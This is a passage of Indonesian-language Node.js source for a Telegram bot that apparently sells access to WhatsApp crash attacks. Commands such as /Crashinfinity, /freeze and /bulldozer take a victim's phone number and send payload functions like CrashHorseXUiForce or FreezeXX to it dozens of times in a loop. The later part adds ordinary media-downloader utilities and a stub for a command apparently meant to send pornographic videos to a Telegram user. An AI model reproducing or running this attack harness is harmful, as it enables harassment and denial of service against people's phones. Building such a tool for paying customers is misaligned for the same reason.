`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/tqpmtn.jpg", {
      caption: `
\`\`\`
 Target : ${formattedNumber}༻
 Status : Sending!!⏳...༻
 Runtime : ${runtime}༻
\`\`\`
`, parse_mode: "Markdown"
    });

    console.log("\x1b[32m[NEON GHOST]\x1b[0m BLANK HARD");
    for (let i = 0; i <= 20; i++) {
    await FriendCrashSimple(sock, target);
    await sleep(1000);
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

 await bot.editMessageCaption(`
\`\`\`
 Target : ${formattedNumber}༻
 Status : Succes✅༻
 Runtime : ${runtime}༻
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/Crashinfinity (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomPhoto = getRandomPhoto();
  const userId = msg.from.id;
  const runtime = getBotRuntime();
 // const cooldown = checkCooldown(userId);
  const target = Jid;

 // if (cooldown > 0) {
  // return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
//  }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomPhoto, {
    caption: `\`\`\`
❌Akses Di Tolak\nAnda Bukan Pengguna Premium\n( ! ) Tidak ada akses silahkan beli akses atau juga bisa membeli script ke owner,contact owner ada di bawahh
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐎͢𝐰͡𝐧͜𝐞͢𝐫", url: `https://T.me/${config.USERNAME}` }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    
  //    if (cooldown > 0) {
//  return bot.sendMessage(chatId, 
//`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
//  }

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/tqpmtn.jpg", {
      caption: `
\`\`\`
 Target : ${formattedNumber}༻
 Status : Sending!!⏳...༻
 Runtime : ${runtime}༻
\`\`\`
`, parse_mode: "Markdown"
    });

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i <= 79; i++) {
    await CrashHorseXUiForce(target);
    await sleep(4000);
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

 await bot.editMessageCaption(`
\`\`\`
 Target : ${formattedNumber}༻
 Status : Succes✅༻
 Runtime : ${runtime}༻
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/blankdelay (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomPhoto = getRandomPhoto();
  const userId = msg.from.id;
  const runtime = getBotRuntime();
 // const cooldown = checkCooldown(userId);
  const target = Jid;

 // if (cooldown > 0) {
 // return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
//  }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomPhoto, {
    caption: `\`\`\`
❌Akses Di Tolak\nAnda Bukan Pengguna Premium\n( ! ) Tidak ada akses silahkan beli akses atau juga bisa membeli script ke owner,contact owner ada di bawahh
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐎͢𝐰͡𝐧͜𝐞͢𝐫", url: `https://T.me/${config.USERNAME}` }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    
  //    if (cooldown > 0) {
 // return bot.sendMessage(chatId, 
//`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
//  }

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/tqpmtn.jpg", {
      caption: `
\`\`\`
 Target : ${formattedNumber}༻
 Status : Sending!!⏳...༻
 Runtime : ${runtime}༻
\`\`\`
`, parse_mode: "Markdown"
    });

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i <= 49; i++) {
    await BlankDelay(sock, target);
    await sleep(1000);
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

 await bot.editMessageCaption(`
\`\`\`
 Target : ${formattedNumber}༻
 Status : Succes✅༻
 Runtime : ${runtime}༻
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/freeze (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomPhoto = getRandomPhoto();
  const userId = msg.from.id;
  const runtime = getBotRuntime();
  const cooldown = checkCooldown(userId);
  const target = Jid;

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomPhoto, {
    caption: `\`\`\`
❌Akses Di Tolak\nAnda Bukan Pengguna Premium\n( ! ) Tidak ada akses silahkan beli akses atau juga bisa membeli script ke owner,contact owner ada di bawahh
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐎͢𝐰͡𝐧͜𝐞͢𝐫", url: `https://T.me/${config.USERNAME}` }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/tqpmtn.jpg", {
      caption: `
\`\`\`
 Target : ${formattedNumber}༻
 Status : Sending!!⏳...༻
 Runtime : ${runtime}༻
\`\`\`
`, parse_mode: "Markdown"
    });

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i <= 79; i++) {
    await FreezeXX(sock, target);
    await sleep(2000);
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

 await bot.editMessageCaption(`
\`\`\`
 Target : ${formattedNumber}༻
 Status : Succes✅༻
 Runtime : ${runtime}༻
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/bulldozer (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomPhoto = getRandomPhoto();
  const userId = msg.from.id;
  const runtime = getBotRuntime();
  const cooldown = checkCooldown(userId);
  const target = Jid;

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomPhoto, {
    caption: `\`\`\`
❌Akses Di Tolak\nAnda Bukan Pengguna Premium\n( ! ) Tidak ada akses silahkan beli akses atau juga bisa membeli script ke owner,contact owner ada di bawahh
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐎͢𝐰͡𝐧͜𝐞͢𝐫", url: `https://T.me/${config.USERNAME}` }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/tqpmtn.jpg", {
      caption: `
\`\`\`
 Target : ${formattedNumber}༻
 Status : Sending!!⏳...༻
 Runtime : ${runtime}༻
\`\`\`
`, parse_mode: "Markdown"
    });

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i <= 100; i++) {
    await BulldoEso(sock, target);
    await sleep(3000);
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

 await bot.editMessageCaption(`
\`\`\`
 Target : ${formattedNumber}༻
 Status : Succes✅༻
 Runtime : ${runtime}༻
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/blankmaklo (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomPhoto = getRandomPhoto();
  const userId = msg.from.id;
  const runtime = getBotRuntime();
  const cooldown = checkCooldown(userId);
  const target = Jid;

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomPhoto, {
    caption: `\`\`\`
❌Akses Di Tolak\nAnda Bukan Pengguna Premium\n( ! ) Tidak ada akses silahkan beli akses atau juga bisa membeli script ke owner,contact owner ada di bawahh
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐎͢𝐰͡𝐧͜𝐞͢𝐫", url: `https://T.me/${config.USERNAME}` }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/tqpmtn.jpg", {
      caption: `
\`\`\`
 Target : ${formattedNumber}༻
 Status : Sending!!⏳...༻
 Runtime : ${runtime}༻
\`\`\`
`, parse_mode: "Markdown"
    });

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i <= 79; i++) {
    await nullPacth(sock, target);
    await sleep(2000);
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

 await bot.editMessageCaption(`
\`\`\`
 Target : ${formattedNumber}༻
 Status : Succes✅༻
 Runtime : ${runtime}༻
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
//=======plugins=======//
bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



const moment = require('moment');

bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to view the premium list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "<blockquote>ＬＩＳＴ ＰＲＥＭＩＵＭ\n\n</blockquote>";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "HTML" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});

//SCMD
bot.onText(/\/tourl/, async (msg) => {
  const chatId = msg.chat.id;

  // Cek kalau reply ke file/foto/video
  if (!msg.reply_to_message || (!msg.reply_to_message.photo && !msg.reply_to_message.document && !msg.reply_to_message.video)) {
    return bot.sendMessage(chatId, "❌ Reply sebuah *foto/video/file* dengan perintah `/tourl` untuk mengubah jadi link.", { parse_mode: "Markdown" });
  }

  try {
    // Ambil file id
    let fileId;
    if (msg.reply_to_message.photo) {
      // Kalau foto, ambil resolusi terbesar
      fileId = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1].file_id;
    } else if (msg.reply_to_message.document) {
      fileId = msg.reply_to_message.document.file_id;
    } else if (msg.reply_to_message.video) {
      fileId = msg.reply_to_message.video.file_id;
    }

    // Dapatkan link file dari Telegram
    const file = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

    // Ambil buffer file dari Telegram
    const response = await axios.get(fileUrl, { responseType: "arraybuffer" });

    // Upload ke Catbox
    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", Buffer.from(response.data), {
      filename: file.file_path.split("/").pop(),
    });

    const upload = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    // Kirim link hasil upload
    bot.sendMessage(chatId, `✅ *File berhasil diupload!*\n\n🌐 Link: ${upload.data}`, {
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Terjadi error saat upload file ke Catbox.");
  }
});

// LIST JAWABAN RANDOM
const apakahList = [
  "Iya, 100% bener!",
  "Kayaknya sih iya...",
  "Tidak, jangan berharap wkwk.",
  "Mungkin... dunia penuh misteri.",
  "Tentu saja tidak.",
  "Peluang kecil, tapi masih mungkin.",
  "Iya banget!",
  "Nggak deh, maaf ya.",
  "Sepertinya iya.",
  "Sepertinya tidak.",
  "Hmm… 50:50."
];

// /apakah <pertanyaan>
bot.onText(/\/apakah(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const pertanyaan = match[1]; // teks setelah /apakah

  // Jika user tidak menulis pertanyaan
  if (!pertanyaan) {
    return bot.sendMessage(
      chatId,
      "Kamu mau nanya apa? Contoh:\n/apakah aku ganteng?"
    );
  }

  // Pilih jawaban random
  const jawaban = apakahList[Math.floor(Math.random() * apakahList.length)];

  bot.sendMessage(
    chatId,
    `🔮 *Pertanyaan:* ${pertanyaan}\n\n💬 *Jawaban:* ${jawaban}`,
    { parse_mode: "Markdown" }
  );
});

// Command: /infosholat
bot.onText(/\/infosholat(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const city = match[1] ? match[1].trim() : null;
  if (!city) {
    return bot.sendMessage(
      chatId,
      "❗ *Input Hilang!*\n\nGunakan format:\n`/infosholat <nama kota>`\n\nContoh:\n`/infosholat jakarta`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    // 🔹 Ambil data dari API Aladhan
    const res = await axios.get("https://api.aladhan.com/v1/timingsByCity", {
      params: {
        city: city,
        country: "Indonesia",
        method: 2, // metode hisab umum
      },
    });

    const data = res.data.data;
    const timings = data.timings;

    // 🔹 Format output
    const text = `
🕌 *Jadwal Sholat - ${city}*  
📅 ${data.date.readable} (${data.date.hijri.date})

🌅 Subuh: *${timings.Fajr}*
☀️ Dzuhur: *${timings.Dhuhr}*
🌇 Ashar: *${timings.Asr}*
🌆 Maghrib: *${timings.Maghrib}*
🌙 Isya: *${timings.Isha}*

🕒 Zona waktu: *${data.meta.timezone}*
    `;

    bot.sendMessage(chatId, text, { parse_mode: "Markdown" });

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `⚠️ Tidak bisa mengambil jadwal sholat untuk kota *${city}*`, { parse_mode: "Markdown" });
  }
});

bot.onText(/\/ppcouple/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const url = "https://ikyyyz-api-officiall.vercel.app/random/ppcouple?apikey=kyzz";

    const res = await fetch(url);
    const json = await res.json();

    if (!json.status) {
      return bot.sendMessage(chatId, "❌ Gagal Respon");
    }

    const { cowo, cewe } = json.result;

    await bot.sendPhoto(chatId, cowo, { caption: "👦 lanang" });
    await bot.sendPhoto(chatId, cewe, { caption: "👧 betina" });

  } catch (e) {
    console.log(e);
    bot.sendMessage(chatId, "❌ Server Down");
  }
});

bot.on("message", async (msg) => {
    if (!msg.text) return;
    if (!msg.text.startsWith("/roblox")) return;

    const chatId = msg.chat.id;
    const username = msg.text.split(" ")[1];
    if (!username) {
        return bot.sendMessage(chatId, "❌ Contoh: /roblox username");
    }

    try {
        // 1. Cari User ID
        const userRes = await axios.post(
            "https://users.roblox.com/v1/usernames/users",
            {
                usernames: [username],
                excludeBannedUsers: false
            },
            { headers: { "Content-Type": "application/json" } }
        );

        if (!userRes.data.data.length) {
            return bot.sendMessage(chatId, "❌ User Roblox tidak ditemukan");
        }

        const userId = userRes.data.data[0].id;

        // 2. Detail User
        const detail = await axios.get(
            `https://users.roblox.com/v1/users/${userId}`
        );

        // 3. Avatar Detail
        const avatar = await axios.get(
            `https://avatar.roblox.com/v1/users/${userId}/avatar`
        );

        // 4. Thumbnail AVATAR DEPAN (AMBIL IMAGE URL)
        const thumbFrontRes = await axios.get(
            "https://thumbnails.roblox.com/v1/users/avatar",
            {
                params: {
                    userIds: userId,
                    size: "420x420",
                    format: "Png",
                    isCircular: false
                }
            }
        );

        const avatarFrontUrl = thumbFrontRes.data.data[0].imageUrl;

        // 5. Headshot
        const thumbHeadRes = await axios.get(
            "https://thumbnails.roblox.com/v1/users/avatar-headshot",
            {
                params: {
                    userIds: userId,
                    size: "420x420",
                    format: "Png",
                    isCircular: false
                }
            }
        );

        const avatarHeadUrl = thumbHeadRes.data.data[0].imageUrl;

        const caption =
`🎮 ROBLOX USER

👤 Username : ${detail.data.name}
🪪 Display  : ${detail.data.displayName}
🆔 User ID  : ${userId}
📅 Created  : ${detail.data.created}
📝 Bio     : ${detail.data.description || "-"}

🎽 Assets  : ${avatar.data.assets.length}
`;

        // KIRIM FOTO DEPAN
        await bot.sendPhoto(chatId, avatarFrontUrl, { caption });

        // KIRIM HEADSHOT
        await bot.sendPhoto(chatId, avatarHeadUrl);

        // LINK AVATAR 3D (PUTAR / SAMPING)
        await bot.sendMessage(
            chatId,
            `🧍 Avatar 3D (samping/belakang):\nhttps://www.roblox.com/users/${userId}/avatar`
        );

    } catch (e) {
        console.error(e.message);
        bot.sendMessage(chatId, "❌ Error mengambil data Roblox");
    }
});

bot.on("message", async (msg) => {
    if (!msg.text?.startsWith("/tiktok")) return;

    const chatId = msg.chat.id;
    let url = msg.text.split(" ")[1];
    if (!url) return bot.sendMessage(chatId, "❌ Link TikTok mana?");

    try {
        // resolve vt.tiktok shortlink
        if (url.includes("vt.tiktok.com")) {
            const r = await axios.get(url, {
                maxRedirects: 5,
                headers: { "User-Agent": "Mozilla/5.0" }
            });
            url = r.request.res.responseUrl;
        }

        const api = "https://tikwm.com/api/";
        const res = await axios.get(api, {
            params: { url },
            headers: {
                "User-Agent": "Mozilla/5.0",
                "Accept": "application/json"
            }
        });

        const videoUrl = res.data?.data?.play;
        if (!videoUrl) {
            return bot.sendMessage(chatId, "❌ API tidak mengembalikan video");
        }

        const video = await axios.get(videoUrl, {
            responseType: "arraybuffer",
            headers: { "User-Agent": "Mozilla/5.0" }
        });

        await bot.sendVideo(chatId, video.data);

    } catch (e) {
        console.error(e?.response?.data || e.message);
        bot.sendMessage(chatId, "❌ Error saat download TikTok");
    }
});

// Instagram
bot.onText(/\/ig (.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  if (!url) {
    return bot.sendMessage(chatId, "❌ Format salah!\n\nGunakan `/ig <link Instagram>`", { parse_mode: "Markdown" });
  }

  try {
    const apiUrl = `https://api.diioffc.web.id/api/download/instagram?url=${encodeURIComponent(url)}`;
    const { data } = await axios.get(apiUrl);

    if (!data || !data.result) {
      return bot.sendMessage(chatId, "❌ Tidak ada media ditemukan.");
    }

    // Normalisasi agar selalu array
    const mediaList = Array.isArray(data.result) ? data.result : [data.result];

    for (const media of mediaList) {
      if (media.url.includes(".mp4")) {
        await bot.sendVideo(chatId, media.url, { caption: "📥 Instagram Video" });
      } else {
        await bot.sendPhoto(chatId, media.url, { caption: "📥 Instagram Photo" });
      }
    }
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Error saat mengambil media IG.");
  }
});

// BRAT
bot.onText(/\/brat(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a text.\n\nExample:\n/brat Hallo All");
    }

    const text = match[1].trim();
    const apiUrl = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(text)}`;

    try {
        // Brat langsung berupa gambar, jadi bisa dikirim langsung
        await bot.sendPhoto(chatId, apiUrl, {
            caption: `🖼️ Brat Image Generated\n\n✏️ Text: *${text}*`,
            parse_mode: "Markdown"
        });
    } catch (err) {
        console.error("Brat API Error:", err);
        bot.sendMessage(chatId, "❌ Error generating Brat image. Please try again later.");
    }
});

// Jika format salah
bot.onText(/\/sendbokep$/, (msg) => {
  bot.sendMessage(msg.chat.id, "Format benar:\n/sendbokep <id_telegram> <jumlah_video (opsional, max 50)>");
});

// PINTEREST
bot.onText(/\/pinterest(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a search query.\n\nExample:\n/pinterest iPhone 17 Pro Max");
    }

    const query = match[1].trim();
    const apiUrl = `https://api.nvidiabotz.xyz/search/pinterest?q=${encodeURIComponent(query)}`;

    https.get(apiUrl, (res) => {
        let body = "";
        res.on("data", chunk => body += chunk);
        res.on("end", async () => {
            try {
                const data = JSON.parse(body);

                if (!data || !data.result || data.result.length === 0) {
                    return bot.sendMessage(chatId, "❌ No Pinterest images found for your query.");
                }

                const firstResult = data.result[0];
                await bot.sendPhoto(chatId, firstResult, {
                    caption: `📌 Pinterest Result for: *${query}*`,
                    parse_mode: "Markdown"
                });
            } catch (err) {
                console.error("Pinterest API Error:", err);
                bot.sendMessage(chatId, "❌ Error fetching Pinterest image. Please try again later.");
            }
        });
    }).on("error", (err) => {
        console.error("HTTPS Error:", err);
        bot.sendMessage(chatId, "❌ Failed to connect to Pinterest API.");
    });
});
//MD MENU
bot.onText(/^\/gpt(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = (match[1] || "").trim();

  if (!query) {
    return bot.sendMessage(
      chatId,
      "⚠️ Contoh:\n/gpt apa itu gravitasi?"
    );
  }

  // pesan loading
  await bot.sendMessage(chatId, "⏳ Tunggu sebentar, lagi mikir...");

  try {
    const { data } = await axios.get("https://www.abella.icu/gpt-3.5", {
      params: { q: query },
      timeout: 30000,
    });

    const answer = data?.data?.answer;

    if (answer) {
      return bot.sendMessage(
        chatId,
        "```\n" + answer + "\n```",
        { parse_mode: "Markdown" }
      );
    } else {
      return bot.sendMessage(chatId, "⚠️ Tidak ada respons valid dari AI.");
    }

  } catch (err) {
    console.error("GPT Error:", err);
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/^\/trackip(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = (match[1] || "").trim();

  if (!ip) return bot.sendMessage(chatId, "⚠️ Contoh:\n/trackip 8.8.8.8");

  bot.sendMessage(chatId, "🛰 Sedang melacak IP...");

  try {
